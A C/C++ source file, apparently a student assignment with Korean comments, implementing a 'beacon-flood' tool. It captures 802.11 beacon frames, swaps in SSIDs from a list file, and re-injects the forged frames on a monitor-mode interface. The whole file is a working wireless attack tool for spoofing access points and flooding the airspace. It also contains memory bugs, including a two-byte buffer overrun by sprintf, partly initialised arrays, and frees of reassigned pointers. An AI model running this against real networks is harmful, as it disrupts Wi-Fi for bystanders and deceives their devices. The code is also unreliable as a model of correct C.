#include "main.h"
#define MAX_LENGTH 32

void usage(){ //경고 메시지
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

int BeaconRequest(pcap_t* pcap, char* file) { //ARP Request 발송
    struct Radiotap_header* radiotap = (struct Radiotap_header*)malloc(sizeof(struct Radiotap_header));
    struct Beacon* beacon = (struct Beacon*)malloc(sizeof(struct Beacon));
    struct Wireless* wrls = (struct Wireless*)malloc(sizeof(struct Wireless));

    char** packet_cp = (char**)calloc(300,sizeof(char*));
    for(int i=0; i<100; i++){
        packet_cp[i] = (char*)calloc(200,sizeof(char));
    }

    FILE *fp;   //ssid-list-file 읽어오기 위한 변수
    char essid_c[2];
    int count = 0;
    int beacon_count[100];

    fp = fopen(file, "r"); //파일 읽어오기
    if(fp == NULL){
        printf("파일 안에 내용이 존재하지 않습니다.\n");
        return -1;
    }

    //beacon 패킷 캡처
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* ESSID;
        const u_char* packet;
        char buf[MAX_LENGTH];

        char *essid_c_final = (char *)calloc(30, sizeof(char));
        char *bssid_c = (char *)calloc(20, sizeof(char));

        int cmp = -1;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        radiotap = (struct Radiotap_header*)packet;
        beacon = (struct Beacon*)(packet+radiotap->length);

        if(beacon->type == 0x0080){
            
            wrls = (struct Wireless*)(packet+radiotap->length+sizeof(struct Beacon));
            ESSID = packet + radiotap->length+sizeof(struct Beacon)+sizeof(struct Wireless);
            packet = packet + radiotap->length+sizeof(struct Beacon)+sizeof(struct Wireless) + wrls->ssid_len;

            //bssid 생성
            sprintf(bssid_c,"%02x:%02x:%02x:%02x:%02x:%02x", beacon->BSSID[0], beacon->BSSID[1], beacon->BSSID[2], beacon->BSSID[3], beacon->BSSID[4], beacon->BSSID[5]);

            //essid 생성
            for(int i = 0; i<wrls->ssid_len; i++){
                sprintf(essid_c, "%c", ESSID[i]);
                strcat(essid_c_final, essid_c);
            }

            //beacon 생성
            for (int i=0; count-1 >= i; i++){
                if (strstr(packet_cp[i], bssid_c) != NULL) {
                    cmp = i;
                    beacon_count[i] += 1;
                    break;
                }
            }
            if (cmp < 0) {
                cmp = count;
                beacon_count[count] = 1;
                count += 1;
            }

            uint len_aff = (header->caplen) - (radiotap->length + sizeof(struct Beacon) + sizeof(struct Wireless) + wrls->ssid_len);

            if(fgets(buf, MAX_LENGTH, fp) != NULL){
                wrls->ssid_len = strlen(buf)-1;
            } else {
                rewind(fp);
                fgets(buf, MAX_LENGTH, fp);
                wrls->ssid_len = strlen(buf)-1;
            }
            (struct Wireless*)(packet+radiotap->length+sizeof(struct Beacon));
            uint len = radiotap->length + sizeof(struct Beacon) + sizeof(struct Wireless) + wrls->ssid_len; 
            u_char* tmp = (u_char *)calloc(len_aff+len, sizeof(u_char *));
            u_char* now = tmp;
            memcpy(now, radiotap, radiotap->length);
            now += radiotap->length;
            memcpy(now, beacon, sizeof(struct Beacon));
            now += sizeof(struct Beacon);
            memcpy(now, wrls, sizeof(struct Wireless));
            now += sizeof(struct Wireless);
            memcpy(now, buf, wrls->ssid_len);
            now += wrls->ssid_len;
            memcpy(now, packet, len_aff);
            now += len_aff;

            int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(tmp), len + len_aff);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            sprintf(packet_cp[cmp], "%s\t%d\t%s\t->\t%s\n", bssid_c, beacon_count[cmp], essid_c_final, buf);
            
            system("clear");
            puts("BSSID\t\t\tBeacons\tESSID -> 변환된 ESSID\n");

            for (int i=0; i<count; i++){
                printf("%s", packet_cp[i]);
            }

            free(essid_c_final);
            free(bssid_c);
        }else{ //Probe Request일 시
            packet = packet + radiotap->length;
        }
    }
    fclose(fp);
    free(radiotap);
    free(beacon);
    free(wrls);
    return 0;
}

int BeaconFlooding(char* dev, char* file) { 
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "error: pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    BeaconRequest(pcap, file);

    pcap_close(pcap);

    return 0;
}

int main(int argc, char** argv) {
    if (argc < 3) {
        usage();
        return -1;
    }

    char* dev = *(argv + 1); //interface
    char* file = *(argv + 2); 
    BeaconFlooding(dev, file);

    return 0;
}
